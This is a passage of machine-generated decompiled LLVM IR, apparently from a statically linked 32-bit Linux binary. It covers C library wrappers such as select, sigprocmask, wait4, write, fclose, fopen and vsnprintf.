  %v0_804ff69 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804ff69 = sub i32 0, %v0_804ff69
  %v2_804ff6b = inttoptr i32 %v1_804ff64 to i32*
  store i32 %v1_804ff69, i32* %v2_804ff6b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804ff70

dec_label_pc_804ff70:                             ; preds = %entry, %dec_label_pc_804ff64
  %v0_804ff70 = phi i32 [ %v1_804ff59, %entry ], [ -1, %dec_label_pc_804ff64 ]
  %v2_804ff72 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804ff72, i32* @edx, align 4
  %v2_804ff74 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804ff74, i32* @ebx, align 4
  ret i32 %v0_804ff70

; uselistorder directives
  uselistorder i32 %v1_804ff59, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32)* @sched_yield, { 1, 0 }
  uselistorder label %dec_label_pc_804ff70, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804ff79 = load i32, i32* @esi, align 4
  store i32 %v0_804ff79, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_804ff91 = load i32, i32* @ebx, align 4
  %v1_804ff99 = call i32 @int80_syscall(i32 142)
  store i32 %v0_804ff91, i32* @ebx, align 4
  store i32 %v1_804ff99, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804ff99, -4095
  br i1 %tmp, label %dec_label_pc_804ffb1, label %dec_label_pc_804ffa5

dec_label_pc_804ffa5:                             ; preds = %entry
  %v1_804ffa5 = call i32 @__errno_location(i32 %v0_804ff91)
  %v0_804ffaa = load i32, i32* %esi.global-to-local, align 4
  %v1_804ffaa = sub i32 0, %v0_804ffaa
  %v2_804ffac = inttoptr i32 %v1_804ffa5 to i32*
  store i32 %v1_804ffaa, i32* %v2_804ffac, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804ffb1

dec_label_pc_804ffb1:                             ; preds = %entry, %dec_label_pc_804ffa5
  %v0_804ffb1 = phi i32 [ %v1_804ff99, %entry ], [ -1, %dec_label_pc_804ffa5 ]
  %v2_804ffb4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804ffb4, i32* @esi, align 4
  ret i32 %v0_804ffb1

; uselistorder directives
  uselistorder i32 %v1_804ff99, { 1, 0, 2 }
  uselistorder i32 %v0_804ff91, { 1, 0 }
  uselistorder label %dec_label_pc_804ffb1, { 1, 0 }
}

define i32 @__GI_setrlimit(i32 %arg1, %rlimit* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804ffb8 = load i32, i32* @ebx, align 4
  store i32 %v0_804ffb8, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v4_804ffcb = call i32 @setrlimit(i32 %arg1, %rlimit* %arg2)
  store i32 %v4_804ffcb, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v4_804ffcb, -4095
  br i1 %tmp, label %dec_label_pc_804ffe4, label %dec_label_pc_804ffd8

dec_label_pc_804ffd8:                             ; preds = %entry
  %v0_804ffd8 = load i32, i32* %stack_var_-4, align 4
  %v1_804ffd8 = call i32 @__errno_location(i32 %v0_804ffd8)
  %v0_804ffdd = load i32, i32* %ebx.global-to-local, align 4
  %v1_804ffdd = sub i32 0, %v0_804ffdd
  %v2_804ffdf = inttoptr i32 %v1_804ffd8 to i32*
  store i32 %v1_804ffdd, i32* %v2_804ffdf, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804ffe4

dec_label_pc_804ffe4:                             ; preds = %entry, %dec_label_pc_804ffd8
  %v0_804ffe4 = phi i32 [ %v4_804ffcb, %entry ], [ -1, %dec_label_pc_804ffd8 ]
  %v2_804ffe8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804ffe8, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804ffe4

; uselistorder directives
  uselistorder i32 %v4_804ffcb, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804ffe4, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  %stack_var_-12 = alloca i32, align 4
  %v0_804ffed = load i32, i32* @esi, align 4
  %v4_804fff1 = ptrtoint %_TYPEDEF_sigset_t* %arg2 to i32
  store i32 %v4_804fff1, i32* @ecx, align 4
  %v2_804fffd = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v2_804fffd, label %dec_label_pc_8050016, label %dec_label_pc_8050001

dec_label_pc_8050001:                             ; preds = %entry
  %tmp11 = icmp ult i32 %arg1, 3
  br i1 %tmp11, label %dec_label_pc_8050016, label %dec_label_pc_8050006

dec_label_pc_8050006:                             ; preds = %dec_label_pc_8050001
  %v1_8050006 = call i32 @__errno_location(i32 %v0_804ffed)
  %v1_805000b = inttoptr i32 %v1_8050006 to i32*
  store i32 22, i32* %v1_805000b, align 4
  br label %dec_label_pc_805003d

dec_label_pc_8050016:                             ; preds = %dec_label_pc_8050001, %entry
  store i32 8, i32* %esi.global-to-local, align 4
  %v0_805001b = load i32, i32* @ebx, align 4
  %v7_8050023 = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp3)
  store i32 %v0_805001b, i32* @ebx, align 4
  store i32 %v7_8050023, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v7_8050023, -4095
  br i1 %tmp, label %dec_label_pc_805003d, label %dec_label_pc_805002f

dec_label_pc_805002f:                             ; preds = %dec_label_pc_8050016
  %v1_805002f = call i32 @__errno_location(i32 %v0_805001b)
  %v0_8050034 = load i32, i32* %esi.global-to-local, align 4
  %v1_8050034 = sub i32 0, %v0_8050034
  %v2_8050036 = inttoptr i32 %v1_805002f to i32*
  store i32 %v1_8050034, i32* %v2_8050036, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805003d

dec_label_pc_805003d:                             ; preds = %dec_label_pc_805002f, %dec_label_pc_8050016, %dec_label_pc_8050006
  %storemerge = phi i32 [ -1, %dec_label_pc_8050006 ], [ %v7_8050023, %dec_label_pc_8050016 ], [ -1, %dec_label_pc_805002f ]
  %v2_805003d = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805003d, i32* @edx, align 4
  store i32 %v0_804ffed, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v7_8050023, { 1, 0, 2 }
  uselistorder i32 %v0_805001b, { 1, 0 }
  uselistorder %_TYPEDEF_sigset_t* %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__libc_sigsuspend(%_TYPEDEF_sigset_t* %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050044 = load i32, i32* @ebx, align 4
  store i32 %v0_8050044, i32* %stack_var_-4, align 4
  %v4_805004d = ptrtoint %_TYPEDEF_sigset_t* %arg1 to i32
  store i32 %v4_805004d, i32* %ebx.global-to-local, align 4
  %v3_8050058 = call i32 @sigsuspend(%_TYPEDEF_sigset_t* %arg1)
  store i32 %v3_8050058, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v3_8050058, -4095
  br i1 %tmp, label %dec_label_pc_8050071, label %dec_label_pc_8050065

dec_label_pc_8050065:                             ; preds = %entry
  %v0_8050065 = load i32, i32* %stack_var_-4, align 4
  %v1_8050065 = call i32 @__errno_location(i32 %v0_8050065)
  %v0_805006a = load i32, i32* %ebx.global-to-local, align 4
  %v1_805006a = sub i32 0, %v0_805006a
  %v2_805006c = inttoptr i32 %v1_8050065 to i32*
  store i32 %v1_805006a, i32* %v2_805006c, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050071

dec_label_pc_8050071:                             ; preds = %entry, %dec_label_pc_8050065
  %v0_8050071 = phi i32 [ %v3_8050058, %entry ], [ -1, %dec_label_pc_8050065 ]
  %v2_8050073 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8050073, i32* @edx, align 4
  %v2_8050075 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050075, i32* @ebx, align 4
  ret i32 %v0_8050071

; uselistorder directives
  uselistorder i32 %v3_8050058, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder %_TYPEDEF_sigset_t* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8050071, { 1, 0 }
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v0_8050078 = load i32, i32* @edi, align 4
  store i32 %v0_8050078, i32* %stack_var_-4, align 4
  store i32 %tmp3, i32* %edi.global-to-local, align 4
  %v0_8050080 = load i32, i32* @ebx, align 4
  %v2_8050088 = call i32 @time(i32* %arg1)
  store i32 %v0_8050080, i32* @ebx, align 4
  store i32 %v2_8050088, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v2_8050088, -4095
  br i1 %tmp, label %dec_label_pc_80500a0, label %dec_label_pc_8050094

dec_label_pc_8050094:                             ; preds = %entry
  %v1_8050094 = call i32 @__errno_location(i32 %v0_8050080)
  %v0_8050099 = load i32, i32* %edi.global-to-local, align 4
  %v1_8050099 = sub i32 0, %v0_8050099
  %v2_805009b = inttoptr i32 %v1_8050094 to i32*
  store i32 %v1_8050099, i32* %v2_805009b, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80500a0

dec_label_pc_80500a0:                             ; preds = %entry, %dec_label_pc_8050094
  %v0_80500a0 = phi i32 [ %v2_8050088, %entry ], [ -1, %dec_label_pc_8050094 ]
  %v2_80500a4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80500a4, i32* @edi, align 4
  ret i32 %v0_80500a0

; uselistorder directives
  uselistorder i32 %v2_8050088, { 1, 0, 2 }
  uselistorder i32 %v0_8050080, { 1, 0 }
  uselistorder label %dec_label_pc_80500a0, { 1, 0 }
}

define i32 @__libc_wait(i32 %arg1) local_unnamed_addr {
entry:
  %v4_80500b5 = call i32 @wait4(i32 -1, i32 %arg1, i32 0, i32 0)
  ret i32 %v4_80500b5
}

define i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80500c0 = load i32, i32* @edi, align 4
  %v0_80500c1 = load i32, i32* @esi, align 4
  store i32 %v0_80500c1, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg4, i32* @esi, align 4
  %v0_80500d5 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_80500dd = call i32 @wait4(i32 %v0_80500d5, i32 %v0_80500c1, i32 %v0_80500c0, i32 %tmp5)
  store i32 %v0_80500d5, i32* @ebx, align 4
  store i32 %v4_80500dd, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v4_80500dd, -4095
  br i1 %tmp, label %dec_label_pc_80500f5, label %dec_label_pc_80500e9

dec_label_pc_80500e9:                             ; preds = %entry
  %v1_80500e9 = call i32 @__errno_location(i32 %v0_80500d5)
  %v0_80500ee = load i32, i32* %esi.global-to-local, align 4
  %v1_80500ee = sub i32 0, %v0_80500ee
  %v2_80500f0 = inttoptr i32 %v1_80500e9 to i32*
  store i32 %v1_80500ee, i32* %v2_80500f0, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80500f5

dec_label_pc_80500f5:                             ; preds = %entry, %dec_label_pc_80500e9
  %v0_80500f5 = phi i32 [ %v4_80500dd, %entry ], [ -1, %dec_label_pc_80500e9 ]
  %v2_80500f7 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80500f7, i32* @edx, align 4
  %v2_80500f8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80500f8, i32* @esi, align 4
  store i32 %v0_80500c0, i32* @edi, align 4
  ret i32 %v0_80500f5

; uselistorder directives
  uselistorder i32 %v4_80500dd, { 1, 0, 2 }
  uselistorder i32 %v0_80500d5, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80500f5, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_805010d = call i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, i32 0)
  ret i32 %v4_805010d
}

define i32 @__libc_write(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp8, i32* %stack_var_-12, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050118 = load i32, i32* @edi, align 4
  store i32 %v0_8050118, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg2, i32* @ecx, align 4
  %v0_8050128 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_8050130 = call i32 @write(i32 %v0_8050128, i32 %tmp8, i32 %tmp6)
  store i32 %v0_8050128, i32* @ebx, align 4
  store i32 %v3_8050130, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v3_8050130, -4095
  br i1 %tmp, label %dec_label_pc_8050148, label %dec_label_pc_805013c

dec_label_pc_805013c:                             ; preds = %entry
  %v1_805013c = call i32 @__errno_location(i32 %v0_8050128)
  %v0_8050141 = load i32, i32* %edi.global-to-local, align 4
  %v1_8050141 = sub i32 0, %v0_8050141
  %v2_8050143 = inttoptr i32 %v1_805013c to i32*
  store i32 %v1_8050141, i32* %v2_8050143, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8050148

dec_label_pc_8050148:                             ; preds = %entry, %dec_label_pc_805013c
  %v0_8050148 = phi i32 [ %v3_8050130, %entry ], [ -1, %dec_label_pc_805013c ]
  %v2_805014a = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805014a, i32* @edx, align 4
  store i32 %tmp6, i32* @ecx, align 4
  %v2_805014c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805014c, i32* @edi, align 4
  ret i32 %v0_8050148

; uselistorder directives
  uselistorder i32 %v3_8050130, { 1, 0, 2 }
  uselistorder i32 %v0_8050128, { 1, 0, 2 }
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @write, { 1, 0 }
  uselistorder label %dec_label_pc_8050148, { 1, 0 }
}

define i32 @__GI_toupper(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @edx, align 4
  %v1_8050154 = add i32 %arg1, 128
  %v6_805015f = icmp ugt i32 %v1_8050154, 383
  br i1 %v6_805015f, label %dec_label_pc_805016a, label %dec_label_pc_8050161

dec_label_pc_8050161:                             ; preds = %entry
  %v0_8050161 = load i32, i32* inttoptr (i32 134621124 to i32*), align 4
  %v2_8050166 = mul i32 %arg1, 2
  %v3_8050166 = add i32 %v0_8050161, %v2_8050166
  %v4_8050166 = inttoptr i32 %v3_8050166 to i16*
  %v5_8050166 = load i16, i16* %v4_8050166, align 2
  %v6_8050166 = sext i16 %v5_8050166 to i32
  store i32 %v6_8050166, i32* @edx, align 4
  br label %dec_label_pc_805016a

dec_label_pc_805016a:                             ; preds = %entry, %dec_label_pc_8050161
  %v0_805016a = phi i32 [ %arg1, %entry ], [ %v6_8050166, %dec_label_pc_8050161 ]
  ret i32 %v0_805016a

; uselistorder directives
  uselistorder label %dec_label_pc_805016a, { 1, 0 }
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_8050170 = load i32, i32* @ebp, align 4
  %v0_8050171 = load i32, i32* @edi, align 4
  %v0_8050172 = load i32, i32* @esi, align 4
  %v0_8050173 = load i32, i32* @ebx, align 4
  %v4_8050177 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8050177, i32* @esi, align 4
  %v1_805017b = add i32 %v4_8050177, 52
  %v2_805017b = inttoptr i32 %v1_805017b to i32*
  %v3_805017b = load i32, i32* %v2_805017b, align 4
  store i32 %v3_805017b, i32* @ebp, align 4
  %v1_805017e = icmp eq i32 %v3_805017b, 0
  %v1_8050180 = icmp eq i1 %v1_805017e, false
  br i1 %v1_8050180, label %dec_label_pc_80501a1, label %dec_label_pc_8050182

dec_label_pc_8050182:                             ; preds = %entry
  %v1_8050182 = add i32 %v4_8050177, 56
  store i32 %v1_8050182, i32* @ebx, align 4
  %v4_8050191 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134540701, i32 %v1_8050182)
  %v0_8050196 = load i32, i32* @ebx, align 4
  %v1_8050199 = call i32 @pthread_mutex_lock(i32 %v0_8050196)
  %v0_80501a3.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80501a1

dec_label_pc_80501a1:                             ; preds = %entry, %dec_label_pc_8050182
  %v0_80501ab = phi i32 [ %v4_8050177, %entry ], [ %v0_80501a3.pre, %dec_label_pc_8050182 ]
  store i32 0, i32* @edi, align 4
  %v1_80501a3 = inttoptr i32 %v0_80501ab to i8*
  %v2_80501a3 = load i8, i8* %v1_80501a3, align 1
  %v3_80501a3 = and i8 %v2_80501a3, 64
  %v4_80501a3 = icmp eq i8 %v3_80501a3, 0
  br i1 %v4_80501a3, label %dec_label_pc_80501a1.dec_label_pc_80501b6_crit_edge, label %dec_label_pc_80501a8

dec_label_pc_80501a1.dec_label_pc_80501b6_crit_edge: ; preds = %dec_label_pc_80501a1
  br label %dec_label_pc_80501b6

dec_label_pc_80501a8:                             ; preds = %dec_label_pc_80501a1
  %v1_80501ac = inttoptr i32 %v0_80501ab to i16*
  %v2_80501ac = call i32 @fflush_unlocked(i16* %v1_80501ac)
  store i32 %v2_80501ac, i32* @edi, align 4
  %v0_80501b9.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80501b6

dec_label_pc_80501b6:                             ; preds = %dec_label_pc_80501a1.dec_label_pc_80501b6_crit_edge, %dec_label_pc_80501a8
  %v0_80501b9 = phi i32 [ %v0_80501ab, %dec_label_pc_80501a1.dec_label_pc_80501b6_crit_edge ], [ %v0_80501b9.pre, %dec_label_pc_80501a8 ]
  %v1_80501b9 = add i32 %v0_80501b9, 4
  %v2_80501b9 = inttoptr i32 %v1_80501b9 to i32*
  %v3_80501b9 = load i32, i32* %v2_80501b9, align 4
  %v1_80501bc = call i32 @__libc_close(i32 %v3_80501b9)
  %v2_80501c4 = icmp slt i32 %v1_80501bc, 0
  %v1_80501c6 = icmp eq i1 %v2_80501c4, false
  br i1 %v1_80501c6, label %dec_label_pc_80501cb, label %dec_label_pc_80501c8

dec_label_pc_80501c8:                             ; preds = %dec_label_pc_80501b6
  store i32 -1, i32* @edi, align 4
  br label %dec_label_pc_80501cb

dec_label_pc_80501cb:                             ; preds = %dec_label_pc_80501b6, %dec_label_pc_80501c8
  %v0_80501cb = load i32, i32* @esi, align 4
  %v1_80501cb = add i32 %v0_80501cb, 4
  %v2_80501cb = inttoptr i32 %v1_80501cb to i32*
  store i32 -1, i32* %v2_80501cb, align 4
  %v2_80501dd = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_80501dd, i32* @ebx, align 4
  %v4_80501e2 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-48, i32 134540701, i32 ptrtoint (i32* @global_var_80627f8.205 to i32))
  %v1_80501ee = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_80627f8.205 to i32))
  %v0_80501f3 = load i32, i32* @global_var_806507c.206, align 4
  %v1_80501f8 = add i32 %v0_80501f3, 1
  store i32 %v1_80501f8, i32* @global_var_806507c.206, align 4
  %v3_8050203 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-48, i32 1)
  %v0_805020b = load i32, i32* @esi, align 4
  %v1_805020b = inttoptr i32 %v0_805020b to i16*
  %v2_805020b = load i16, i16* %v1_805020b, align 2
  %v3_805020b = and i16 %v2_805020b, 24576
  store i16 %v3_805020b, i16* %v1_805020b, align 2
  %v0_8050210 = load i32, i32* @esi, align 4
  %v1_8050210 = inttoptr i32 %v0_8050210 to i16*
  %v2_8050210 = load i16, i16* %v1_8050210, align 2
  %v3_8050210 = or i16 %v2_8050210, 48
  store i16 %v3_8050210, i16* %v1_8050210, align 2
  br i1 %v1_8050180, label %dec_label_pc_8050229, label %dec_label_pc_8050218

dec_label_pc_8050218:                             ; preds = %dec_label_pc_80501cb
  %v3_8050221 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  br label %dec_label_pc_8050229

dec_label_pc_8050229:                             ; preds = %dec_label_pc_80501cb, %dec_label_pc_8050218
  %v0_8050229 = load i32, i32* @esi, align 4
  %v1_8050229 = add i32 %v0_8050229, 1
  %v2_8050229 = inttoptr i32 %v1_8050229 to i8*
  %v3_8050229 = load i8, i8* %v2_8050229, align 1
  %v4_8050229 = and i8 %v3_8050229, 64
  %v5_8050229 = icmp eq i8 %v4_8050229, 0
  br i1 %v5_8050229, label %dec_label_pc_805023d, label %dec_label_pc_805022f

dec_label_pc_805022f:                             ; preds = %dec_label_pc_8050229
  %v1_8050232 = add i32 %v0_8050229, 8
  %v2_8050232 = inttoptr i32 %v1_8050232 to i32*
  %v3_8050232 = load i32, i32* %v2_8050232, align 4
  %v1_8050235 = call i32 @free(i32 %v3_8050232)
  br label %dec_label_pc_805023d

dec_label_pc_805023d:                             ; preds = %dec_label_pc_8050229, %dec_label_pc_805022f
  %v4_8050249 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-48, i32 134540701, i32 ptrtoint (i32* @global_var_80627f8.205 to i32))
  %v1_8050255 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_80627f8.205 to i32))
  %v0_805025c = load i32, i32* @global_var_8065080.207, align 128
  %v1_805025c = add i32 %v0_805025c, 1
  store i32 %v1_805025c, i32* @global_var_8065080.207, align 128
  %v3_8050265 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-48, i32 1)
  %v0_805026a = call i32 @_stdio_openlist_dec_use()
  %v0_8050272 = load i32, i32* @edi, align 4
  store i32 %v0_8050173, i32* @ebx, align 4
  store i32 %v0_8050172, i32* @esi, align 4
  store i32 %v0_8050171, i32* @edi, align 4
  store i32 %v0_8050170, i32* @ebp, align 4
  ret i32 %v0_8050272

; uselistorder directives
  uselistorder label %dec_label_pc_805023d, { 1, 0 }
  uselistorder label %dec_label_pc_8050229, { 1, 0 }
  uselistorder label %dec_label_pc_80501cb, { 1, 0 }
  uselistorder label %dec_label_pc_80501b6, { 1, 0 }
  uselistorder label %dec_label_pc_80501a1, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_805028b = inttoptr i32 %arg2 to i8*
  %v5_805028b = call i32 @_stdio_fopen(i32 %arg1, i8* %v4_805028b, i32 0, i32 -1)
  ret i32 %v5_805028b
}

define i32 @vsprintf(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_80502a5 = inttoptr i32 %arg1 to i8*
  %v5_80502a5 = call i32 @__GI_vsnprintf(i8* %v4_80502a5, i32 -1, i32 %arg2, i32 %arg3)
  ret i32 %v5_80502a5
}

define i32 @sprintf(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_12 = alloca i32, align 4
  %v2_80502b3 = ptrtoint i32* %stack_var_12 to i32
  %v4_80502c6 = inttoptr i32 %arg1 to i8*
  %v5_80502c6 = call i32 @__GI_vsnprintf(i8* %v4_80502c6, i32 -1, i32 %arg2, i32 %v2_80502b3)
  ret i32 %v5_80502c6
}

define i32 @__GI_vsnprintf(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_80502d0 = load i32, i32* @ebp, align 4
  %v0_80502d1 = load i32, i32* @edi, align 4
  %v0_80502d2 = load i32, i32* @esi, align 4
  %v0_80502d3 = load i32, i32* @ebx, align 4
  store i32 %v0_80502d3, i32* %stack_var_-16, align 4
  %v4_80502d7 = ptrtoint i8* %arg1 to i32
  store i32 %v4_80502d7, i32* @esi, align 4
  %v2_80502db = ptrtoint i32* %stack_var_-40 to i32
  store i32 %arg2, i32* @edi, align 4
  store i32 208, i32* %stack_var_-96, align 4
  %v2_805030c = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_805030c, i32* @ebp, align 4
  %v1_8050310 = sub i32 -1, %v4_80502d7
  store i32 %v1_8050310, i32* @ebx, align 4
  %v1_8050313 = call i32 @__stdio_init_mutex(i32 %v2_80502db)
  %v0_8050323 = load i32, i32* @ebx, align 4
  %v1_8050323 = load i32, i32* @edi, align 4
  %tmp = icmp ugt i32 %v0_8050323, %v1_8050323
  br i1 %tmp, label %dec_label_pc_8050327, label %dec_label_pc_8050329

dec_label_pc_8050327:                             ; preds = %entry
  store i32 %v1_8050323, i32* @ebx, align 4
  br label %dec_label_pc_8050329

dec_label_pc_8050329:                             ; preds = %entry, %dec_label_pc_8050327
  %v1_8050329 = phi i32 [ %v0_8050323, %entry ], [ %v1_8050323, %dec_label_pc_8050327 ]
  %v0_8050329 = load i32, i32* @esi, align 4
  %v2_8050329 = add i32 %v0_8050329, %v1_8050329
  %v4_8050354 = inttoptr i32 %arg3 to i8*
  %v5_8050354 = call i32 @_vfprintf_internal(i32 %v2_805030c, i8* %v4_8050354, i32 %arg4, i32 %v2_8050329)
  store i32 %v5_8050354, i32* @edx, align 4
  %v0_805035e = load i32, i32* @ebx, align 4
  %v1_805035e = icmp eq i32 %v0_805035e, 0
  br i1 %v1_805035e, label %dec_label_pc_8050378, label %dec_label_pc_8050362

dec_label_pc_8050362:                             ; preds = %dec_label_pc_8050329
  %v16_8050366 = icmp eq i32 %v1_8050329, 0
  %v1_805036a = icmp eq i1 %v16_8050366, false
  br i1 %v1_805036a, label %dec_label_pc_8050371, label %dec_label_pc_805036c

dec_label_pc_805036c:                             ; preds = %dec_label_pc_8050362
  %v1_805036c = add i32 %v2_8050329, -1
  br label %dec_label_pc_8050371

dec_label_pc_8050371:                             ; preds = %dec_label_pc_8050362, %dec_label_pc_805036c
  %stack_var_-80.0.in = phi i32 [ %v0_8050329, %dec_label_pc_8050362 ], [ %v1_805036c, %dec_label_pc_805036c ]
  %stack_var_-80.0 = inttoptr i32 %stack_var_-80.0.in to i8*
  store i8 0, i8* %stack_var_-80.0, align 1
  %v0_805037b.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8050378

dec_label_pc_8050378:                             ; preds = %dec_label_pc_8050329, %dec_label_pc_8050371
  %v0_805037b = phi i32 [ %v5_8050354, %dec_label_pc_8050329 ], [ %v0_805037b.pre, %dec_label_pc_8050371 ]
  %v2_805037d = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805037d, i32* @ebx, align 4
  store i32 %v0_80502d2, i32* @esi, align 4
  store i32 %v0_80502d1, i32* @edi, align 4
  store i32 %v0_80502d0, i32* @ebp, align 4
  ret i32 %v0_805037b

; uselistorder directives
  uselistorder i32 %v0_8050329, { 1, 0 }
  uselistorder i32 %v1_8050329, { 1, 0 }
  uselistorder i32 %v1_8050323, { 1, 2, 0 }
  uselistorder i32 %v0_8050323, { 1, 0 }
  uselistorder i32* %stack_var_-96, { 1, 0 }
  uselistorder label %dec_label_pc_8050378, { 1, 0 }
  uselistorder label %dec_label_pc_8050371, { 1, 0 }
  uselistorder label %dec_label_pc_8050329, { 1, 0 }
}

define i32 @pclose(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8050384 = load i32, i32* @edi, align 4
  %v0_8050386 = load i32, i32* @ebx, align 4
  store i32 %v0_8050386, i32* %stack_var_-12, align 4
  store i32 %arg1, i32* @edi, align 4
  %v2_8050398 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8050398, i32* %stack_var_-60, align 4
  %v4_805039d = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134540701, i32 ptrtoint (i32* @global_var_8065060.208 to i32))
  store i32 ptrtoint (i32* @global_var_8065060.208 to i32), i32* %stack_var_-60, align 4
